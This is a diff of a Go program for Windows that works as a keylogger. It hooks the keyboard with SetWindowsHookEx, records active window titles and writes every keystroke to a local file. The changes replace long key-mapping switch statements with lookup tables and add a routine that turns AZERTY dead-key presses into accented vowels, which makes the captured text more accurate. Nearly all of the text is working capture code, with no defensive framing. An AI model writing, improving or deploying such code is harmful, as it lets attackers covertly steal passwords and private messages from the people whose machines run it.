@@ -25,11 +25,19 @@ var (
 	procGetWindowTextW = user32.NewProc("GetWindowTextW")
 	keyboardHook HHOOK
 	tmpKeylog string
+	vowelMin string = "aeiou"
+	vowelMaj string = "AEIOU"
+	circumMinMin = []rune{'â','ê','î','ô','û'}
+	circumMinMaj = []rune{'ä','ë','ï','ö','ü'}
+	circumMajMin = []rune{'Â','Ê','Î','Ô','Û'}
+	circumMajMaj = []rune{'Ä','Ë','Ï','Ö','Ü'}
+	writer Writer
+
 )
 const (
 	WH_KEYBOARD_LL = 13
 	WM_KEYDOWN = 256
-	WM_SYSKEYUP = 261
+	//WM_SYSKEYUP = 261
 	/*WH_KEYBOARD = 2
 	WM_SYSKEYDOWN = 260
 	WM_KEYUP = 257
@@ -75,6 +83,13 @@ type MSG struct {
 	LParam uintptr
 	Time uint32
 	Pt POINT
+}
+
+type Writer struct {
+	file *os.File
+}
+func (w Writer) write(s string) {
+	w.file.WriteString(s)
 }
 
 func SetWindowsHookEx(idHook int, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD) HHOOK {
@@ -147,21 +162,22 @@ func windowLogger() {
 		if syscall.UTF16ToString(b) != "" {
 			if tmpTitle != syscall.UTF16ToString(b) {
 				tmpTitle = syscall.UTF16ToString(b)
-				tmpKeylog += string("\n\n[" + syscall.UTF16ToString(b) + "]\r\n")
+				writer.write(string("\n\n[" + syscall.UTF16ToString(b) + "]\r\n"))
 			}
 		}
 		time.Sleep(1 * time.Millisecond)
 	}
 }
 
-func keylogger(file *os.File) {
+func keylogger() {
 	var msg MSG
 	CAPS, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
 	CAPS = CAPS & 0x000001
 	var CAPS2 uintptr
 	var SHIFT uintptr
-	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
-		(HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
+	var precLog string =""
+	var write bool = false
+	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
 			if nCode == 0 && wparam == WM_KEYDOWN {
 				SHIFT, _, _ = procGetAsyncKeyState.Call(uintptr(w32.VK_LSHIFT))
 				if SHIFT == 32769 || SHIFT == 32768{
@@ -169,341 +185,27 @@ func keylogger(file *os.File) {
 				}
 				kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
 				code := byte(kbdstruct.VkCode)
-				switch code {
-				case w32.VK_CONTROL:
-					tmpKeylog += "[Ctrl]"
-				case w32.VK_BACK:
-					tmpKeylog += "[Back]"
-				case w32.VK_TAB:
-					tmpKeylog += "[Tab]"
-				case w32.VK_RETURN:
-					tmpKeylog += "[Enter]\r\n"
-				case w32.VK_SHIFT:
-					tmpKeylog += "[Shift]"
-				case w32.VK_MENU:
-					tmpKeylog += "[Alt]"
-				case w32.VK_CAPITAL:
+				if code == w32.VK_CAPITAL {
 					if CAPS==1{
 						CAPS=0
 					}else{
 						CAPS=1
 					}
-				case w32.VK_ESCAPE:
-					tmpKeylog += "[Esc]"
-				case w32.VK_SPACE:
-					tmpKeylog += " "
-				case w32.VK_PRIOR:
-					tmpKeylog += "[PageUp]"
-				case w32.VK_NEXT:
-					tmpKeylog += "[PageDown]"
-				case w32.VK_END:
-					tmpKeylog += "[End]"
-				case w32.VK_HOME:
-					tmpKeylog += "[Home]"
-				case w32.VK_LEFT:
-					tmpKeylog += "[Left]"
-				case w32.VK_UP:
-					tmpKeylog += "[Up]"
-				case w32.VK_RIGHT:
-					tmpKeylog += "[Right]"
-				case w32.VK_DOWN:
-					tmpKeylog += "[Down]"
-				case w32.VK_SELECT:
-					tmpKeylog += "[Select]"
-				case w32.VK_PRINT:
-					tmpKeylog += "[Print]"
-				case w32.VK_EXECUTE:
-					tmpKeylog += "[Execute]"
-				case w32.VK_SNAPSHOT:
-					tmpKeylog += "[PrintScreen]"
-				case w32.VK_INSERT:
-					tmpKeylog += "[Insert]"
-				case w32.VK_DELETE:
-					tmpKeylog += "[Delete]"
-				case w32.VK_HELP:
-					tmpKeylog += "[Help]"
-				case w32.VK_LWIN:
-					tmpKeylog += "[LeftWindows]"
-				case w32.VK_RWIN:
-					tmpKeylog += "[RightWindows]"
-				case w32.VK_APPS:
-					tmpKeylog += "[Applications]"
-				case w32.VK_SLEEP:
-					tmpKeylog += "[Sleep]"
-				case w32.VK_NUMPAD0:
-					tmpKeylog += "0"
-				case w32.VK_NUMPAD1:
-					tmpKeylog += "1"
-				case w32.VK_NUMPAD2:
-					tmpKeylog += "2"
-				case w32.VK_NUMPAD3:
-					tmpKeylog += "3"
-				case w32.VK_NUMPAD4:
-					tmpKeylog += "4"
-				case w32.VK_NUMPAD5:
-					tmpKeylog += "5"
-				case w32.VK_NUMPAD6:
-					tmpKeylog += "6"
-				case w32.VK_NUMPAD7:
-					tmpKeylog += "7"
-				case w32.VK_NUMPAD8:
-					tmpKeylog += "8"
-				case w32.VK_NUMPAD9:
-					tmpKeylog += "9"
-				case w32.VK_MULTIPLY:
-					tmpKeylog += "*"
-				case w32.VK_ADD:
-					tmpKeylog += "+"
-				case w32.VK_SEPARATOR:
-					tmpKeylog += "[Separator]"
-				case w32.VK_SUBTRACT:
-					tmpKeylog += "-"
-				case w32.VK_DECIMAL:
-					tmpKeylog += "."
-				case w32.VK_DIVIDE:
-					tmpKeylog += "[Devide]"
-				case w32.VK_F1:
-					tmpKeylog += "[F1]"
-				case w32.VK_F2:
-					tmpKeylog += "[F2]"
-				case w32.VK_F3:
-					tmpKeylog += "[F3]"
-				case w32.VK_F4:
-					tmpKeylog += "[F4]"
-				case w32.VK_F5:
-					tmpKeylog += "[F5]"
-				case w32.VK_F6:
-					tmpKeylog += "[F6]"
-				case w32.VK_F7:
-					tmpKeylog += "[F7]"
-				case w32.VK_F8:
-					tmpKeylog += "[F8]"
-				case w32.VK_F9:
-					tmpKeylog += "[F9]"
-				case w32.VK_F10:
-					tmpKeylog += "[F10]"
-				case w32.VK_F11:
-					tmpKeylog += "[F11]"
-				case w32.VK_F12:
-					tmpKeylog += "[F12]"
-				case w32.VK_NUMLOCK:
-					tmpKeylog += "[NumLock]"
-				case w32.VK_SCROLL:
-					tmpKeylog += "[ScrollLock]"
-				/*case w32.VK_LSHIFT:
-					tmpKeylog += "[LeftShift]"
-				case w32.VK_RSHIFT:
-					tmpKeylog += "[RightShift]"*/
-				case w32.VK_LCONTROL:
-					tmpKeylog += "[Ctrl]"
-				case w32.VK_RCONTROL:
-					tmpKeylog += "[Ctrl]"
-				case w32.VK_LMENU:
-					tmpKeylog += "[Alt]"
-				case w32.VK_RMENU:
-					tmpKeylog += "[RightMenu]"
-
-				case w32.VK_OEM_7:
-					tmpKeylog += "²"
 				}
 				if SHIFT==1{
 					CAPS2 = 1
 				}else{
 					CAPS2 = 0
 				}
+
 				if (CAPS==0 && CAPS2==0) || (CAPS==1 && CAPS2==1 ){
-					switch code{
-					case 0x41:
-						tmpKeylog += "a"
-					case 0x42:
-						tmpKeylog += "b"
-					case 0x43:
-						tmpKeylog += "c"
-					case 0x44:
-						tmpKeylog += "d"
-					case 0x45:
-						tmpKeylog += "e"
-					case 0x46:
-						tmpKeylog += "f"
-					case 0x47:
-						tmpKeylog += "g"
-					case 0x48:
-						tmpKeylog += "h"
-					case 0x49:
-						tmpKeylog += "i"
-					case 0x4A:
-						tmpKeylog += "j"
-					case 0x4B:
-						tmpKeylog += "k"
-					case 0x4C:
-						tmpKeylog += "l"
-					case 0x4D:
-						tmpKeylog += "m"
-					case 0x4E:
-						tmpKeylog += "n"
-					case 0x4F:
-						tmpKeylog += "o"
-					case 0x50:
-						tmpKeylog += "p"
-					case 0x51:
-						tmpKeylog += "q"
-					case 0x52:
-						tmpKeylog += "r"
-					case 0x53:
-						tmpKeylog += "s"
-					case 0x54:
-						tmpKeylog += "t"
-					case 0x55:
-						tmpKeylog += "u"
-					case 0x56:
-						tmpKeylog += "v"
-					case 0x57:
-						tmpKeylog += "w"
-					case 0x58:
-						tmpKeylog += "x"
-					case 0x59:
-						tmpKeylog += "y"
-					case 0x5A:
-						tmpKeylog += "z"
-					case 0x30:
-						tmpKeylog += "à"
-					case 0x31:
-						tmpKeylog += "&"
-					case 0x32:
-						tmpKeylog += "é"
-					case 0x33:
-						tmpKeylog += "\""
-					case 0x34:
-						tmpKeylog += "'"
-					case 0x35:
-						tmpKeylog += "("
-					case 0x36:
-						tmpKeylog += "-"
-					case 0x37:
-						tmpKeylog += "è"
-					case 0x38:
-						tmpKeylog += "_"
-					case 0x39:
-						tmpKeylog += "ç"
-					case 0xbc:
-						tmpKeylog += ","
-					case w32.VK_OEM_1:
-						tmpKeylog += "$"
-					case w32.VK_OEM_2:
-						tmpKeylog += ":"
-					case w32.VK_OEM_3:
-						tmpKeylog += "ù"
-					case w32.VK_OEM_4:
-						tmpKeylog += ")"
-					case w32.VK_OEM_6:
-						tmpKeylog += "^"
-					case w32.VK_OEM_PERIOD:
-						tmpKeylog += ";"
-					case 0xbb:
-						tmpKeylog += "="
-					case 0xdf:
-						tmpKeylog += "!"
-					case w32.VK_OEM_5:
-						tmpKeylog += "*"
-					}
+					tmpKeylog += keys_low[uint16(code)]
+
 				}else {
-					switch code {
-					case 0x41:
-						tmpKeylog += "A"
-					case 0x42:
-						tmpKeylog += "B"
-					case 0x43:
-						tmpKeylog += "C"
-					case 0x44:
-						tmpKeylog += "D"
-					case 0x45:
-						tmpKeylog += "E"
-					case 0x46:
-						tmpKeylog += "F"
-					case 0x47:
-						tmpKeylog += "G"
-					case 0x48:
-						tmpKeylog += "H"
-					case 0x49:
-						tmpKeylog += "I"
-					case 0x4A:
-						tmpKeylog += "J"
-					case 0x4B:
-						tmpKeylog += "K"
-					case 0x4C:
-						tmpKeylog += "L"
-					case 0x4D:
-						tmpKeylog += "M"
-					case 0x4E:
-						tmpKeylog += "N"
-					case 0x4F:
-						tmpKeylog += "O"
-					case 0x50:
-						tmpKeylog += "P"
-					case 0x51:
-						tmpKeylog += "Q"
-					case 0x52:
-						tmpKeylog += "R"
-					case 0x53:
-						tmpKeylog += "S"
-					case 0x54:
-						tmpKeylog += "T"
-					case 0x55:
-						tmpKeylog += "U"
-					case 0x56:
-						tmpKeylog += "V"
-					case 0x57:
-						tmpKeylog += "W"
-					case 0x58:
-						tmpKeylog += "X"
-					case 0x59:
-						tmpKeylog += "Y"
-					case 0x5A:
-						tmpKeylog += "Z"
-					case 0x30:
-						tmpKeylog += "0"
-					case 0x31:
-						tmpKeylog += "1"
-					case 0x32:
-						tmpKeylog += "2"
-					case 0x33:
-						tmpKeylog += "3"
-					case 0x34:
-						tmpKeylog += "4"
-					case 0x35:
-						tmpKeylog += "5"
-					case 0x36:
-						tmpKeylog += "6"
-					case 0x37:
-						tmpKeylog += "7"
-					case 0x38:
-						tmpKeylog += "8"
-					case 0x39:
-						tmpKeylog += "9"
-					case 0xbc:
-						tmpKeylog += "?"
-					case w32.VK_OEM_1:
-						tmpKeylog += "£"
-					case w32.VK_OEM_2:
-						tmpKeylog += "/"
-					case w32.VK_OEM_3:
-						tmpKeylog += "%"
-					case w32.VK_OEM_4:
-						tmpKeylog += "°"
-					case w32.VK_OEM_6:
-						tmpKeylog += "¨"
-					case w32.VK_OEM_PERIOD:
-						tmpKeylog += "."
-					case 0xbb:
-						tmpKeylog += "+"
-					case 0xdf:
-						tmpKeylog += "§"
-					case w32.VK_OEM_5:
-						tmpKeylog += "µ"
-					}
+					tmpKeylog += keys_high[uint16(code)]
 				}
 
-			}else if wparam == WM_SYSKEYUP {
+			}else if wparam == w32.WM_SYSKEYDOWN {
 				kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
 				code := byte(kbdstruct.VkCode)
 				switch code{
@@ -533,8 +235,14 @@ func keylogger(file *os.File) {
 			}
 			//fmt.Printf("%s\n", tmpKeylog)
 			//fmt.Printf("%d\n", code)
-			file.WriteString(tmpKeylog)
-			tmpKeylog=""
+			if tmpKeylog != "" {
+				write,tmpKeylog= harmonize(tmpKeylog, &precLog, !((CAPS == 0 && CAPS2 == 0) || (CAPS == 1 && CAPS2 == 1)))
+				if write {
+					writer.write(tmpKeylog)
+				}
+				precLog = tmpKeylog
+				tmpKeylog = ""
+			}
 			return CallNextHookEx(keyboardHook, nCode, wparam, lparam)
 		}), 0, 0)
 
@@ -545,6 +253,53 @@ func keylogger(file *os.File) {
 
 	UnhookWindowsHookEx(keyboardHook)
 	keyboardHook = 0
+}
+
+func harmonize(tmp string, prec *string, caps bool) (bool,string){
+	fmt.Printf("prec : %s ; tmp : %s\n", *prec, tmp)
+	shouldWrite := false
+	if *prec == "^" && tmp == "^"{
+		tmp="^^"
+		*prec = ""
+	}else if *prec == "¨" && tmp == "¨"{
+		tmp="¨¨"
+		*prec = ""
+	}else if *prec == "^" || *prec == "¨"{
+		shouldWrite = true
+		if caps {
+			for i, l := range vowelMaj {
+				if tmp == string(l) {
+					if *prec == "^" {
+						tmp = string(circumMajMin[i])
+					} else {
+						tmp = string(circumMajMaj[i])
+					}
+					shouldWrite=false
+					break
+				}
+
+			}
+		} else {
+			for i, l := range vowelMin {
+				if tmp == string(l) {
+					if *prec == "^" {
+						tmp = string(circumMinMin[i])
+					} else {
+						tmp = string(circumMinMaj[i])
+					}
+					shouldWrite=false
+					break
+				}
+			}
+		}
+	}
+	if shouldWrite{
+		writer.write(*prec)
+	}
+	if !(tmp == "^" || tmp == "¨") {
+		return true,tmp
+	}
+	return false,tmp
 }
 
 func getKeyboardLayout() uint64{
@@ -571,8 +326,9 @@ func main() {
 		log.Fatal("Cannot create file", err)
 	}
 	defer file.Close()
+	writer.file = file
 	go windowLogger()
-	go keylogger(file)
+	go keylogger()
 	for {
 		time.Sleep(1*time.Millisecond)
 	}
